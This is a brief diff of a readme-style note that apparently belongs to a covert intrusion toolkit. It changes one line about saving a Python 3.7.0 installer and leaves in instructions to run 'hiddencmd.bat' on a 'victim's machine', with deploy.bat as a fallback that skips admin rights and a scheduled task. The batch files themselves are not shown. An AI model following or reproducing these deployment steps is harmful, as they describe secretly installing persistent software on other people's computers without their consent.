@@ -1,4 +1,4 @@
-please download python-3.7.0-amd64.exe and save in this directory
+# Please download python-3.7.0-amd64.exe and save in this directory
 
 you need to execute hiddencmd.bat on victim's machine.
 you can execute deploy.bat file but admin rights will not be requested and no task will be scheduled.
